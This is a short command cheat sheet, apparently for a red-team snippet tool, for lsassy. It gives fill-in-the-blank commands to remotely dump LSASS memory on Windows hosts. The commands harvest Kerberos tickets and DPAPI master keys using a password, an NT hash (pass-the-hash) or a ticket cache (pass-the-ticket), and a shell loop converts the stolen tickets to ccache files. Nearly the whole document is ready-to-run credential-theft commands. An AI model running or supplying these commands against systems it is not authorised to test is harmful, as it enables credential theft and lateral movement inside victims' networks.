# lsassy

% dploot, dpapi

#plateform/linux  #target/remote  #cat/CREDENTIAL-ACCESS/KERBEROS

## desc
```
https://github.com/login-securite/lsassy
```

## Kerberos - tickets harvesting (creds)
-K '<save_path|./>'
```bash
lsassy -d <domain_fqdn> -vv -debug -u <user> -p '<password>' --format pretty -ff json -o <cred_file_path|./lsassy-creds.json>  <target_fqdn>
```

## Kerberos - tickets harvesting (pth)
-K '<save_path|./>'
```bash
lsassy -d <domain_fqdn> -vv -debug -u <user> -H <nt_hash>  --format pretty -ff json -o <cred_file_path|./lsassy-creds.json>  <target_fqdn>
```


## Kerberos - tickets harvesting (ptt)
-K '<save_path|./>'
```bash
KRB5CCNAME=<ccache> lsassy -vv -debug -d <domain_fqdn> -u <user> -k --format pretty -ff json -o <cred_file_path|./lsassy-creds.json>  <target_fqdn>
```

## Kerberos - Convert tickets
```bash
for f in $(ls ~/.config/lsassy/tickets) ; do ticketConverter.py $f $f.ccache ; done
```

## dpapi - Master Keys harvesting 
-M '<save_path|./>'
```bash
lsassy -d <domain_fqdn> -vv -debug -u <user> -p '<password>' --no-tickets  --format pretty -ff json -o <cred_file_path|./lsassy-creds.json>  <target_fqdn>
```

## only users
```bash
lsassy -d <domain_fqdn> -vv -debug -u <user> -p '<password>' --no-tickets  --format pretty -ff json -o <cred_file_path|./lsassy-creds.json>  --users <target_fqdn>
```